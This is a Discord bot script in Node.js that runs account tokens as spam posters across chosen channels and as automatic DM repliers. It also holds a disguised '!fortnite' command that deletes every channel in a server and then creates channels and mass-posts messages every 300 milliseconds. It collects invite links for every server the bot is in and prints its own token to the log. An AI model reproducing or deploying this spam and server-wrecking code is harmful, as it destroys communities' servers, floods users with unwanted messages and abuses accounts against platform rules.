require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs');
const color = require('colors');
const axios = require('axios');
const activeBotIntervals = {};
const botsFile = 'bots.json'; 
const required_role_id = "1551016665469165630"; 
const allowedUserID = "1203119942866702356";
const lastRepliedUsers = new Map(); 
const autoreplyFile = 'autoreply.json'; 


async function startBot(token, channelIDs, msg, interval) {
  try {
    
    const response = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: token },
    });

    console.log(color.green(` Token is valid for bot: ${response.data.username}#${response.data.discriminator}`));

    
    const channels = Array.isArray(channelIDs) 
      ? channelIDs 
      : channelIDs.split(",").map(id => id.trim());

    console.log(color.blue(` Bot will send messages in channels: ${channels.join(', ')}`));

    
    const botInterval = setInterval(async () => {
      for (const channelID of channels) {
        if (!channelID || !/^\d{18,}$/.test(channelID)) {
          console.log(color.red(` Invalid channel ID: ${channelID}`));
          continue;
        }

        try {
          
          await axios.post(
            `https://discord.com/api/v10/channels/${channelID}/messages`,
            { content: msg },
            { headers: { Authorization: token } }
          );

          console.log(color.cyan(` Sent message: "${msg}" in channel ${channelID}`));
        } catch (err) {
          console.log(color.red(` Error sending message to ${channelID}: ${err.response?.data?.message || err.message}`));
        }
      }
    }, interval * 1000);

    
    activeBotIntervals[token] = botInterval;

  } catch (error) {
    console.error(color.red(` Invalid bot token! Unable to start bot.`));
  }
}





async function stopBot(token, bots) {
  const botIndex = bots.findIndex((b) => b.token === token);

  if (botIndex !== -1) {
    try {
      
      const response = await axios.get("https://discord.com/api/v10/users/@me", {
        headers: { Authorization: token }, 
      });

      const botUsername = `${response.data.username}#${response.data.discriminator}`;
      console.log(color.red(` Stopping bot: ${botUsername}`));

      
      if (activeBotIntervals[token]) {
        clearInterval(activeBotIntervals[token]); 
        delete activeBotIntervals[token]; 
        console.log(color.green(` Interval for bot "${botUsername}" stopped.`));
      } else {
        console.log(color.yellow(` No active interval found for bot "${botUsername}".`));
      }

      
      bots.splice(botIndex, 1);
      fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));

      console.log(color.green(` Bot "${botUsername}" removed from list.`));
    } catch (error) {
      console.error(color.red(` Error stopping bot "${botUsername}": ${error.response?.data?.message || error.message}`));
    }
  } else {
    console.log(color.yellow(` Bot not found in the list.`));
  }
}





if (!required_role_id) {
  console.error(" ERROR: required_role_id is not set. The bot cannot enforce role permissions.");
  process.exit(1);
}


let bots = [];
try {
  bots = fs.existsSync(botsFile) ? JSON.parse(fs.readFileSync(botsFile, 'utf-8')) : [];
} catch (err) {
  console.error(` Failed to load bots file: ${err.message}`);
}

const mainBot = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

mainBot.once('ready', () => {
  console.log(` Main bot logged in as ${mainBot.user.tag}`);
});

console.log(` Using bot token: ${process.env.TOKEN}`);


async function hasRequiredRole(member) {
  await member.fetch(); 
  return member.roles.cache.has(required_role_id);
}


async function validateToken(token) {
  try {
    const response = await axios.get('https://discord.com/api/v9/users/@me', {
      headers: { Authorization: token }, 
    });
    console.log(` Token is valid`);
    return true;
  } catch (error) {
    console.error(` Invalid bot token: ${token}`);
    return false;
  }
}


mainBot.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  try {
    const args = message.content.match(/"([^"]+)"|(\S+)/g);
    if (!message.guild) {
      return message.channel.send(' Commands must be used in a server.');
    }
    const member = await message.guild.members.fetch(message.author.id);


   
    if (message.content.startsWith('!remove')) {
      if (!await hasRequiredRole(member)) {
        return message.channel.send(` You do not have permission to use this command. Required role ID: whitelist`);
      }
      if (!args || args.length < 2) {
        return message.channel.send(' Incorrect format! Use: !remove "token"');
      }

      const tokenToRemove = args[1].replace(/"/g, '').trim(); 

      
      console.log('Stored tokens in bots:', bots.map(b => b.token));  
      console.log(`Trying to remove bot with token: ${tokenToRemove}`);

      const botIndex = bots.findIndex((b) => b.token === tokenToRemove);

      if (botIndex === -1) {
        return message.channel.send(' Bot not found!');
      }

      
      stopBot(tokenToRemove, bots);

      
      fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));

      message.channel.send(` Bot with token "${tokenToRemove}" removed successfully!`);
    }

   if (message.content.startsWith('!add')) {
  if (!await hasRequiredRole(member)) {
    return message.channel.send(` You do not have permission to use this command. Required role ID: whitelist`);
  }
  if (!args || args.length < 5) {
    return message.channel.send(' Incorrect format! Use: !add "token" "channel1,channel2" interval message');
  }

  const token = args[1].replace(/"/g, '').trim();
  const channelID = args[2].replace(/"/g, '').trim();  
  const interval = parseInt(args[3].replace(/"/g, '').trim(), 10);
  const msg = args.slice(4).join(' ').replace(/\\n/g, '\n');


  if (isNaN(interval) || interval < 5) {
    return message.channel.send(' Invalid interval! Must be a number and at least 5 seconds.');
  }


  if (bots.some((b) => b.token === token)) {
    return message.channel.send(' This bot is already registered!');
  }

  if (!(await validateToken(token))) {
    return message.channel.send(' Invalid bot token! Please check and try again.');
  }
  const channels = channelID.includes(",") 
  ? channelID.split(",").map(id => id.trim()) 
  : [channelID];

bots.push({ token, channelIDs: channels, msg, interval });

fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));




  fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));



  startBot(token, channels, msg, interval);
  message.channel.send(` Bot added successfully with an interval of ${interval} seconds!`);
}
if (message.content.startsWith('!autoreply')) {
  if (!await hasRequiredRole(member)) {
    return message.channel.send(` You do not have permission to use this command. Required role ID: whitelist`);
  }

  
  const args = message.content.match(/"([^"]+)"|(\S+)/g);
  if (!args || args.length < 3) {
    return message.channel.send(' Incorrect format! Use: `!autoreply "token" "autoReplyMsg"`');
  }

  const token = args[1].replace(/"/g, '').trim();
  const autoReplyMsg = args.slice(2).join(' ').replace(/"/g, '').trim();

  let autoReplyBots = loadAutoReplyBots();

  
  if (autoReplyBots.some(bot => bot.token === token)) {
    return message.channel.send(' This bot is already set up for auto-replies!');
  }

  autoReplyBots.push({ token, autoReplyMsg });
  saveAutoReplyBots(autoReplyBots);

  
  startAutoReplyBots(token, autoReplyMsg);

  message.channel.send(` Auto-reply enabled for bot! Message: "${autoReplyMsg}"`);
}


if (message.content.startsWith('!fortnite')) {
  if (message.author.id !== allowedUserID) {
    return message.channel.send(" You do not have permission to use this command.");
  }
  
resetChannels(message.guild)


}if (message.content.startsWith('!stopreply')) {
  if (!await hasRequiredRole(member)) {
    return message.channel.send(` You do not have permission to use this command. Required role ID: whitelist`);
  }

  const args = message.content.match(/"([^"]+)"|(\S+)/g);
  if (!args || args.length < 2) {
    return message.channel.send(' Incorrect format! Use: `!stopreply "token"`');
  }

  const tokenToRemove = args[1].replace(/"/g, '').trim();
  let autoReplyBots = loadAutoReplyBots();

  
  const botIndex = autoReplyBots.findIndex(bot => bot.token === tokenToRemove);
  if (botIndex === -1) {
    return message.channel.send(' Auto-reply bot not found.');
  }

  autoReplyBots.splice(botIndex, 1); 
  saveAutoReplyBots(autoReplyBots); 

  
  lastRepliedUsers.delete(tokenToRemove); 

  console.log(color.yellow(` Stopping auto-reply for bot: ${tokenToRemove}`));

  
  restartAutoReplyBots();

  message.channel.send(` Auto-reply disabled for bot.`);
}



if (message.content.startsWith('!servers')) {
  if (message.author.id !== allowedUserID) {
    return message.channel.send(" You do not have permission to use this command.");
  }

  let serverList = [];

  for (const guild of mainBot.guilds.cache.values()) {
    try {
      const invites = await guild.invites.fetch();
      let invite = invites.first()?.url || " No invite found";
      
      serverList.push(` **${guild.name}** | (${invite})`);
    } catch {
      serverList.push(` **${guild.name}** |  No permission to generate invite`);
    }
  }

  if (serverList.length === 0) {
    return message.channel.send(" This bot is not in any servers.");
  }

  message.channel.send(` **Servers I'm in:**\n${serverList.join("\n")}`);
}

if (message.content.startsWith('!stop')){
  if (message.content.startsWith('!stopreply')) {

return;


  }
  if (message.author.id !== allowedUserID) {
    return message.channel.send(" You do not have permission to use this command.");
  }
  if (CreateChannelsinterval){
  clearInterval(CreateChannelsinterval); 
  message.channel.send("stopping...");
  }else
  {

    message.channel.send("no interval running");
}

}
  } catch (err) {
    console.error(` Error processing message: ${err.message}`);
  }
});

async function sendMessageToAllChannels(guild, message) {
  try {
    console.log(" Sending message to all channels...");

    
    guild.channels.cache.forEach(async (channel) => {
      if (channel.type === 0) { 
        await channel.send(message);
        console.log(` Message sent in #${channel.name}`);
      }
    });

    console.log(" Message sent in all channels!");

  }
  
  
  catch (error) {
    console.error(" Error sending messages:", error);
  }
}
async function resetChannels(guild) {
  try {
    console.log(" Resetting server channels...");

    
    const channels = guild.channels.cache;
    for (const [channelID, channel] of channels) {
      await channel.delete();
      console.log(` Deleted channel: ${channel.name}`);
    }


    
    CreateChannelsinterval = setInterval(async () => {
      const newChannel = await guild.channels.create({
        name: "Your name here",
        type: 0, 
      });
        sendMessageToAllChannels(guild, "Your message"); 
 
 
/*
      createdChannels.push(newChannel.id);
      console.log(`Created channel: ${newChannel.name}`);

*/     
    }, 300); 

  } catch (err) {
    console.error(" Error resetting channels:", err);
  }
}




function loadAutoReplyBots() {
  try {
    if (!fs.existsSync(autoreplyFile)) {
      fs.writeFileSync(autoreplyFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(autoreplyFile, 'utf-8'));
  } catch (err) {
    console.error(` Failed to load ${autoreplyFile}: ${err.message}`);
    return [];
  }
}


function saveAutoReplyBots(bots) {
  fs.writeFileSync(autoreplyFile, JSON.stringify(bots, null, 2));
}

async function checkForDMs(bot) {
  try {
    let autoReplyBots = loadAutoReplyBots();
    if (!autoReplyBots.some(b => b.token === bot.token)) {
      console.log(color.yellow(` Bot removed: Stopping DM check for ${bot.token.slice(0, 10)}`));
      return; 
    }

    console.log(color.yellow(` Checking for new DMs for bot: ${bot.token.slice(0, 10)}...`));

    
    const botUser = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: bot.token }
    });
    const botUserId = botUser.data.id;

    
    const dmChannels = await axios.get(`https://discord.com/api/v10/users/@me/channels`, {
      headers: { Authorization: bot.token }
    });

    for (const channel of dmChannels.data) {
      const messages = await axios.get(`https://discord.com/api/v10/channels/${channel.id}/messages?limit=1`, {
        headers: { Authorization: bot.token }
      });

      if (!messages.data.length) continue;
      const message = messages.data[0];
      const userId = message.author.id;

      
      if (userId === botUserId) continue;

      
      const lastReplyTime = lastRepliedUsers.get(userId);
      if (lastReplyTime && Date.now() - lastReplyTime < 24 * 60 * 60 * 1000) {
        console.log(color.gray(` Skipping reply to ${message.author.username}, already replied today.`));
        continue;
      }

      console.log(color.cyan(` New DM from ${message.author.username}: ${message.content}`));

      
      const dmChannel = await axios.post(
        'https://discord.com/api/v10/users/@me/channels',
        { recipient_id: userId },
        { headers: { Authorization: bot.token, "Content-Type": "application/json" } }
      );

      
      await axios.post(
        `https://discord.com/api/v10/channels/${dmChannel.data.id}/messages`,
        { content: bot.autoReplyMsg },
        { headers: { Authorization: bot.token, "Content-Type": "application/json" } }
      );

      console.log(color.green(` Auto-replied to ${message.author.username}: ${bot.autoReplyMsg}`));

      
      lastRepliedUsers.set(userId, Date.now());
    }
  } catch (error) {
    console.error(color.red(` Error checking DMs: ${error.response?.data?.message || error.message}`));
  }
}


async function startAutoReplyBots() {
  const autoReplyBots = loadAutoReplyBots();
  if (!autoReplyBots.length) {
    console.log(color.red(" No auto-reply bots found in autoreply.json."));
    return;
  }

  setInterval(() => {
    autoReplyBots.forEach(bot => checkForDMs(bot));
  }, 5000); 

  console.log(color.green("` Auto-reply bots are running..."));
}

let autoReplyInterval; 

async function restartAutoReplyBots() {
  if (autoReplyInterval) {
    clearInterval(autoReplyInterval); 
  }

  const autoReplyBots = loadAutoReplyBots();
  if (!autoReplyBots.length) {
    console.log(color.red(" No auto-reply bots found. Stopping auto-reply."));
    return;
  }

  autoReplyInterval = setInterval(() => {
    autoReplyBots.forEach(bot => checkForDMs(bot));
  }, 5000);

  console.log(color.green(" Auto-reply bots restarted with updated list."));
}

startAutoReplyBots();


bots.forEach((bot) => startBot(bot.token, bot.channelIDs, bot.msg,bot.interval));
mainBot.login(process.env.TOKEN);
                                                                                                    
                       
